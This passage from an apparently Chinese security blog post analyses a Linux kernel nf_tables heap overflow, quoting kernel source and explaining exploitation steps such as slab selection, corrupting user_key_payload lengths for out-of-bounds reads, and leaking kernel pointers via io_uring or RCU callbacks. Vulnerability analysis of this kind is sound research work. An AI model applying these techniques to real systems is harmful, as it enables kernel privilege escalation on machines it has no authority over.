class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_setelem_parse_data</span><span class="params">(struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  struct nft_data_desc *desc,</span></span></span><br><span class="line"><span class="params"><span class="function">  struct nft_data *data, struct nlattr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = nft_data_init(ctx, data, NFT_DATA_VALUE_MAXLEN, desc, attr);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (desc-&gt;type != NFT_DATA_VERDICT &amp;&amp; desc-&gt;len != <span class="built_in">set</span>-&gt;dlen) &#123;</span><br><span class="line">nft_data_release(data, desc-&gt;type);</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在解析value的时候，在最后判断会因为类型是<code>NFT_DATA_VERDICT</code>而不会进入到后面的判段，也就是这里的<code>desc-&gt;len</code>和<code>set-&gt;dlen</code>是可以不一致的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">nft_set_elem_init</span><span class="params">(<span class="keyword">const</span> struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">const</span> struct nft_set_ext_tmpl *tmpl, <span class="keyword">const</span> u32 *key,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">const</span> u32 *key_end, <span class="keyword">const</span> u32 *data, u64 timeout,</span></span></span><br><span class="line"><span class="params"><span class="function">u64 expiration, <span class="keyword">gfp_t</span> gfp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ext</span> *<span class="title">ext</span>;</span></span><br><span class="line"><span class="keyword">void</span> *elem;</span><br><span class="line"></span><br><span class="line">elem = kzalloc(<span class="built_in">set</span>-&gt;ops-&gt;elemsize + tmpl-&gt;len, gfp);</span><br><span class="line"><span class="keyword">if</span> (elem == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">ext = nft_set_elem_ext(<span class="built_in">set</span>, elem);</span><br><span class="line">nft_set_ext_init(ext, tmpl);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(nft_set_ext_key(ext), key, <span class="built_in">set</span>-&gt;klen);</span><br><span class="line"><span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_KEY_END))</span><br><span class="line"><span class="built_in">memcpy</span>(nft_set_ext_key_end(ext), key_end, <span class="built_in">set</span>-&gt;klen);</span><br><span class="line"><span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_DATA))</span><br><span class="line"><span class="built_in">memcpy</span>(nft_set_ext_data(ext), data, <span class="built_in">set</span>-&gt;dlen);</span><br><span class="line"><span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_EXPIRATION)) &#123;</span><br><span class="line">*nft_set_ext_expiration(ext) = get_jiffies_64() + expiration;</span><br><span class="line"><span class="keyword">if</span> (expiration == <span class="number">0</span>)</span><br><span class="line">*nft_set_ext_expiration(ext) += timeout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_TIMEOUT))</span><br><span class="line">*nft_set_ext_timeout(ext) = timeout;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> elem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>desc-&gt;len</code>和<code>set-&gt;dlen</code>不一致的情况下，在这里的<code>memcpy</code>就会出现意想不到的效果。</p><p>如果在申请set时我们控制<code>set-&gt;dlen</code>小于<code>NFT_DATA_VALUE_MAXLEN</code>并在申请element时控制data的长度小于<code>set-&gt;dlen</code>那么在上面初始化element的时候则会发生堆溢出。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>前面已经分析出了漏洞的表现形式，目前所遇到的问题是我们没法直接控制溢出后的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newsetelem</span><span class="params">(struct net *net, struct sock *nlsk,</span></span></span><br><span class="line"><span class="params"><span class="function">struct sk_buff *skb, <span class="keyword">const</span> struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">const</span> struct nlattr *<span class="keyword">const</span> nla[],</span></span></span><br><span class="line"><span class="params"><span class="function">struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line">nla_for_each_nested (attr, nla[NFTA_SET_ELEM_LIST_ELEMENTS], rem) &#123;</span><br><span class="line">err = nft_add_set_elem(&amp;ctx, <span class="built_in">set</span>, attr, nlh-&gt;nlmsg_flags);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里回过头看申请element的回调函数，可以注意到的是，在面对nal中存在多个element时是通过for循环调用<code>nft_add_set_elem</code>申请的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_add_set_elem</span><span class="params">(struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> struct nlattr *attr, u32 nlmsg_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">nla</span>[<span class="title">NFTA_SET_ELEM_MAX</span> + 1];</span></span><br><span class="line">u8 genmask = nft_genmask_next(ctx-&gt;net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ext_tmpl</span> <span class="title">tmpl</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ext</span> *<span class="title">ext</span>, *<span class="title">ext2</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_elem</span> <span class="title">elem</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_binding</span> *<span class="title">binding</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_object</span> *<span class="title">obj</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_userdata</span> *<span class="title">udata</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_data_desc</span> <span class="title">desc</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">nft_registers</span> <span class="title">dreg</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span>;</span></span><br><span class="line">u32 flags = <span class="number">0</span>;</span><br><span class="line">u64 timeout;</span><br><span class="line">u64 expiration;</span><br><span class="line">u8 ulen;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_set_full:</span><br><span class="line"><span class="built_in">set</span>-&gt;ops-&gt;remove(ctx-&gt;net, <span class="built_in">set</span>, &amp;elem);</span><br><span class="line">err_element_clash:</span><br><span class="line">kfree(trans);</span><br><span class="line">err_trans:</span><br><span class="line"><span class="keyword">if</span> (obj)</span><br><span class="line">obj-&gt;use--;</span><br><span class="line"></span><br><span class="line">nf_tables_set_elem_destroy(ctx, <span class="built_in">set</span>, elem.priv);</span><br><span class="line">err_parse_data:</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_ELEM_DATA] != <span class="literal">NULL</span>)</span><br><span class="line">nft_data_release(&amp;elem.data.val, desc.type);</span><br><span class="line">err_parse_key_end:</span><br><span class="line">nft_data_release(&amp;elem.key_end.val, NFT_DATA_VALUE);</span><br><span class="line">err_parse_key:</span><br><span class="line">nft_data_release(&amp;elem.key.val, NFT_DATA_VALUE);</span><br><span class="line">err_set_elem_expr:</span><br><span class="line"><span class="keyword">if</span> (expr != <span class="literal">NULL</span>)</span><br><span class="line">nft_expr_destroy(ctx, expr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看<code>nft_add_set_elem</code>函数对变量的定义可以看到其对elem的定义是定义在栈上的，并且在中途不出现问题的情况下是直接通过<code>return 0</code>进行返回的，这也就意味着该函数栈上的内容是未经过修改的并且也没有初始化，也就意味着可以通过申请两个element来控制第二次写入时的内容。</p><h2 id="利用手法分析"><a href="#利用手法分析" class="headerlink" title="利用手法分析"></a>利用手法分析</h2><p>这里的利用手法很多，因为很久没玩内核的缘故为了能够与时俱进一点所以这里就都给分析一遍的好。</p><h3 id="leak手法"><a href="#leak手法" class="headerlink" title="leak手法"></a>leak手法</h3><p>首先这里先简单介绍一下leak手法，因为上面的在<code>nft_add_set_elem</code>的限制导致在为elem申请堆块时只能从kmalloc-64、kmalloc-128、kmalloc-192中申请。</p><p>这里最多可以溢出的字节数为48所以从目前来看我们熟悉的<code>struct msg_msg</code>结构体是可以使用的，不过可惜的是这里申请elem的所使用的标识为<code>GFP_KERNEL</code>，考虑到容易出现堆隔离无奈放弃。</p><p>最终这里选择使用见面次数不多的<code>user_key_payload</code>结构体来进行leak。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">user_preparse</span><span class="params">(struct key_preparsed_payload *prep)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> *<span class="title">upayload</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> datalen = prep-&gt;datalen;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (datalen &lt;= <span class="number">0</span> || datalen &gt; <span class="number">32767</span> || !prep-&gt;data)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">upayload = kmalloc(<span class="keyword">sizeof</span>(*upayload) + datalen, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!upayload)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* attach the data */</span></span><br><span class="line">prep-&gt;quotalen = datalen;</span><br><span class="line">prep-&gt;payload.data[<span class="number">0</span>] = upayload;</span><br><span class="line">upayload-&gt;datalen = datalen;</span><br><span class="line"><span class="built_in">memcpy</span>(upayload-&gt;data, prep-&gt;data, datalen);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(user_preparse);</span><br></pre></td></tr></table></figure><p>這是其申請過程，可以看到其標識位爲<code>GFP_KERNEL</code>，並且其申請大小是用戶可控的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU destructor */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span>datalen;<span class="comment">/* length of this data */</span></span><br><span class="line"><span class="keyword">char</span>data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>觀察其結構體可以發現其類似於<code>msg_msg</code>也是有datalen來控制其長度的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">user_read</span><span class="params">(<span class="keyword">const</span> struct key *key, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> buflen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> *<span class="title">upayload</span>;</span></span><br><span class="line"><span class="keyword">long</span> ret;</span><br><span class="line"></span><br><span class="line">upayload = user_key_payload_locked(key);</span><br><span class="line">ret = upayload-&gt;datalen;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* we can return the data as is */</span></span><br><span class="line"><span class="keyword">if</span> (buffer &amp;&amp; buflen &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (buflen &gt; upayload-&gt;datalen)</span><br><span class="line">buflen = upayload-&gt;datalen;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(buffer, upayload-&gt;data, buflen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以如果我們可以修改掉<code>user_key_payload-&gt;datalen</code>即可實現越界讀取。</p><p>這裏關於泄露什麼內容存在兩種不同的門派。</p><p>第一種是通過在<code>io_uring_setup</code>设置<code>io_uring</code>上下文时会创建<code>percpu_ref_data</code>结构体，其大小为56正好会在上面的<code>kmalloc-64</code>中申请堆块并且申请的标识位为<code>GFP_KERNEL</code>。这种方法的做法就是同时申请<code>user_key_payload</code>和<code>percpu_ref_data</code>结构体，那么极可能存在两个结构体相邻的情况，此时如果申请的elem紧邻与<code>user_key_payload</code>即可通过修改其<code>datalen</code>成员达到越界读取的效果。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">percpu_ref_init</span><span class="params">(struct percpu_ref *ref, <span class="keyword">percpu_ref_func_t</span> *release,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">gfp_t</span> gfp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> align = <span class="keyword">max_t</span>(<span class="keyword">size_t</span>, <span class="number">1</span> &lt;&lt; __PERCPU_REF_FLAG_BITS,</span><br><span class="line">     __alignof__(<span class="keyword">unsigned</span> <span class="keyword">long</span>));</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> start_count = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">percpu_ref_data</span> *<span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">ref-&gt;percpu_count_ptr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)</span><br><span class="line">__alloc_percpu_gfp(<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>), align, gfp);</span><br><span class="line"><span class="keyword">if</span> (!ref-&gt;percpu_count_ptr)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">data = kzalloc(<span class="keyword">sizeof</span>(*ref-&gt;data), gfp);</span><br><span class="line"><span class="keyword">if</span> (!data) &#123;</span><br><span class="line">free_percpu((<span class="keyword">void</span> __percpu *)ref-&gt;percpu_count_ptr);</span><br><span class="line">ref-&gt;percpu_count_ptr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data-&gt;force_atomic = flags &amp; PERCPU_REF_INIT_ATOMIC;</span><br><span class="line">data-&gt;allow_reinit = flags &amp; PERCPU_REF_ALLOW_REINIT;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line">data-&gt;release = release;</span><br><span class="line">data-&gt;confirm_switch = <span class="literal">NULL</span>;</span><br><span class="line">data-&gt;ref = ref;</span><br><span class="line">ref-&gt;data = data;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(percpu_ref_init);</span><br></pre></td></tr></table></figure><p>通过对<code>percpu_ref_data</code>的初始化函数可以看到这里会给其<code>release</code>成员赋值<code>release</code>函数，以及会给<code>ref</code>成员赋值ref。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (percpu_ref_init(&amp;ctx-&gt;refs, io_ring_ctx_ref_free,</span><br><span class="line">    PERCPU_REF_ALLOW_REINIT, GFP_KERNEL))</span><br><span class="line"><span class="keyword">goto</span> err;</span><br></pre></td></tr></table></figure><p>因为在调用时传入的ref是上述形式，所以这里传入的ref其实是ctx结构体refs成员的偏移地址，也就是依旧落在ctx堆块上。</p><p><strong>（因为在5.10低版本不存在io_uring所以上述代码使用的是5.19）</strong></p><p>第二种leak方式则是利用<code>user_key_payload</code>的rcu成员。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">void</span> (*func)(struct callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="keyword">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure><p>可以看到這裏存在一個func指針，他是在被撤銷時纔會被賦值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">user_revoke</span><span class="params">(struct key *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> *<span class="title">upayload</span> =</span> user_key_payload_locked(key);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* clear the quota */</span></span><br><span class="line">key_payload_reserve(key, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (upayload) &#123;</span><br><span class="line">rcu_assign_keypointer(key, <span class="literal">NULL</span>);</span><br><span class="line">call_rcu(&amp;upayload-&gt;rcu, user_free_payload_rcu);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">EXPORT_SYMBOL(user_revoke);</span><br></pre></td></tr></table></figure><p>這裏會調用<code>call_rcu</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">__call_rcu(struct rcu_head *head, <span class="keyword">rcu_callback_t</span> func)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_data</span> *<span class="title">rdp</span>;</span></span><br><span class="line"><span class="keyword">bool</span> was_alldone;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Misaligned rcu_head! */</span></span><br><span class="line">WARN_ON_ONCE((<span class="keyword">unsigned</span> <span class="keyword">long</span>)head &amp; (<span class="keyword">sizeof</span>(<span class="keyword">void</span> *) - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (debug_rcu_head_queue(head)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Probable double call_rcu(), so leak the callback.</span></span><br><span class="line"><span class="comment"> * Use rcu:rcu_callback trace event to find the previous</span></span><br><span class="line"><span class="comment"> * time callback was passed to __call_rcu().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">WARN_ONCE(<span class="number">1</span>, <span class="string">&quot;__call_rcu(): Double-freed CB %p-&gt;%pS()!!!\n&quot;</span>,</span><br><span class="line">  head, head-&gt;func);</span><br><span class="line">WRITE_ONCE(head-&gt;func, rcu_leak_callback);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">head-&gt;func = func;</span><br><span class="line">head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">local_irq_save(flags);</span><br><span class="line">kasan_record_aux_stack(head);</span><br><span class="line">rdp = this_cpu_ptr(&amp;rcu_data);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Add the callback to our list. */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(!rcu_segcblist_is_enabled(&amp;rdp-&gt;cblist))) &#123;</span><br><span class="line"><span class="comment">// This can trigger due to call_rcu() from offline CPU:</span></span><br><span class="line">WARN_ON_ONCE(rcu_scheduler_active != RCU_SCHEDULER_INACTIVE);</span><br><span class="line">WARN_ON_ONCE(!rcu_is_watching());</span><br><span class="line"><span class="comment">// Very early boot, before rcu_init().  Initialize if needed</span></span><br><span class="line"><span class="comment">// and then drop through to queue the callback.</span></span><br><span class="line"><span class="keyword">if</span> (rcu_segcblist_empty(&amp;rdp-&gt;cblist))</span><br><span class="line">rcu_segcblist_init(&amp;rdp-&gt;cblist);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_cb_ovld(rdp);</span><br><span class="line"><span class="keyword">if</span> (rcu_nocb_try_bypass(rdp, head, &amp;was_alldone, flags))</span><br><span class="line"><span class="keyword">return</span>; <span class="comment">// Enqueued onto -&gt;nocb_bypass, so just leave.</span></span><br><span class="line"><span class="comment">// If no-CBs CPU gets here, rcu_nocb_try_bypass() acquired -&gt;nocb_lock.</span></span><br><span class="line">rcu_segcblist_enqueue(&amp;rdp-&gt;cblist, head);</span><br><span class="line"><span class="keyword">if</span> (__is_kvfree_rcu_offset((<span class="keyword">unsigned</span> <span class="keyword">long</span>)func))</span><br><span class="line">trace_rcu_kvfree_callback(rcu_state.name, head,</span><br><span class="line"> (<span class="keyword">unsigned</span> <span class="keyword">long</span>)func,</span><br><span class="line"> rcu_segcblist_n_cbs(&amp;rdp-&gt;cblist));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">trace_rcu_callback(rcu_state.name, head,</span><br><span class="line">   rcu_segcblist_n_cbs(&amp;rdp-&gt;cblist));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Go handle any RCU core processing required. */</span></span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_RCU_NOCB_CPU) &amp;&amp;</span><br><span class="line">    unlikely(rcu_segcblist_is_offloaded(&amp;rdp-&gt;cblist))) &#123;</span><br><span class="line">__call_rcu_nocb_wake(rdp, was_alldone, flags); <span class="comment">/* unlocks */</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">__call_rcu_core(rdp, head, flags);</span><br><span class="line">local_irq_restore(flags);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">call_rcu</span><span class="params">(struct rcu_head *head, <span class="keyword">rcu_callback_t</span> func)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__call_rcu(head, func);</span><br><span class="line">&#125;</span><br><span 